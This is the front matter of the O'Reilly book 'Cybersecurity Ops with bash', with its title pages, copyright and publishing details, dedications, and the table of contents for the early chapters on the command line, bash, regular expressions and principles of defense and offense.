Paul Troncone & 
 Carl Albing, PhD
Cybersecurity  
Ops with bash
Attack, Defend, and Analyze from  
the Command Line
Paul Troncone and Carl Albing
Cybersecurity Ops with bash
Attack, Defend, and Analyze from the
Command Line
Boston
Farnham
Sebastopol
Tokyo
Beijing
Boston
Farnham
Sebastopol
Tokyo
Beijing
978-1-492-04131-3
[LSI]
Cybersecurity Ops with bash
by Paul Troncone and Carl Albing
Copyright © 2019 Digadel Corp & Carl Albing. All rights reserved.
Printed in the United States of America.
Published by O’Reilly Media, Inc., 1005 Gravenstein Highway North, Sebastopol, CA 95472.
O’Reilly books may be purchased for educational, business, or sales promotional use. Online editions are
also available for most titles (http://oreilly.com). For more information, contact our corporate/institutional
sales department: 800-998-9938 or corporate@oreilly.com.
Acquisitions Editor: Rachel Roumeliotis
Developmental Editors: Virginia Wilson and John
Devins
Production Editor: Nan Barber
Copyeditor: Sharon Wilkey
Proofreader: Christina Edwards
Indexer: Ellen Troutman-Zaig
Interior Designer: David Futato
Cover Designer: Karen Montgomery
Illustrator: Rebecca Demarest
April 2019:
 First Edition
Revision History for the First Edition
2019-04-01: First Release
2020-04-24: Second Release
See http://oreilly.com/catalog/errata.csp?isbn=9781492041313 for release details.
The O’Reilly logo is a registered trademark of O’Reilly Media, Inc. Cybersecurity Ops with bash, the cover
image, and related trade dress are trademarks of O’Reilly Media, Inc.
The views expressed in this work are those of the authors, and do not represent the publisher’s views.
While the publisher and the authors have used good faith efforts to ensure that the information and
instructions contained in this work are accurate, the publisher and the authors disclaim all responsibility
for errors or omissions, including without limitation responsibility for damages resulting from the use of
or reliance on this work. Use of the information and instructions contained in this work is at your own
risk. If any code samples or other technology this work contains or describes is subject to open source
licenses or the intellectual property rights of others, it is your responsibility to ensure that your use
thereof complies with such licenses and/or rights.
To Erin and Kiera. You bring joy to every moment of my life.
—Paul
 
To Cynthia, and our sons Greg, Eric, and Andrew.
—Carl
Table of Contents
Preface. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  xiii
Part I. 
Foundations
1. Command-Line Primer. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  1
The Command Line Defined                                                                                         1
Why bash?                                                                                                                         2
Command-Line Illustrations                                                                                         2
Running Linux and bash on Windows                                                                         2
Git Bash                                                                                                                         3
Cygwin                                                                                                                           3
Windows Subsystem for Linux                                                                                   3
Windows Command Prompt and PowerShell                                                         4
Command-Line Basics                                                                                                    4
Commands, Arguments, Built-ins, and Keywords                                                 5
Standard Input/Output/Error                                                                                    6
Redirection and Piping                                                                                                6
Running Commands in the Background                                                                  8
From Command Line to Script                                                                                  9
Summary                                                                                                                           9
Workshop                                                                                                                          9
2. Bash Primer. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  11
Output                                                                                                                             11
Variables                                                                                                                          12
Positional Parameters                                                                                                13
Input                                                                                                                                13
v
Conditionals                                                                                                                   14
Looping                                                                                                                           17
Functions                                                                                                                         19
Function Arguments                                                                                                  20
Returning Values                                                                                                        20
Pattern Matching in bash                                                                                              20
Writing Your First Script—Detecting Operating System Type                               22
Summary                                                                                                                         23
Workshop                                                                                                                        24
3. Regular Expressions Primer. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  27
Commands in Use                                                                                                         27
grep                                                                                                                               28
grep and egrep                                                                                                            28
Regular Expression Metacharacters                                                                            29
The “.” Metacharacter                                                                                                 29
The “?” Metacharacter                                                                                               29
The “*” Metacharacter                                                                                               30
The “+” Metacharacter                                                                                              30
Grouping                                                                                                                     30
Brackets and Character Classes                                                                                31
Back References                                                                                                          33
Quantifiers                                                                                                                   34
Anchors and Word Boundaries                                                                               34
Summary                                                                                                                         34
Workshop                                                                                                                        35
4. Principles of Defense and Offense. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  37
Cybersecurity                                                                                                                  37
Confidentiality                                                                                                            37
Integrity                                                                                                                       38
Availability                                                                                                                  38
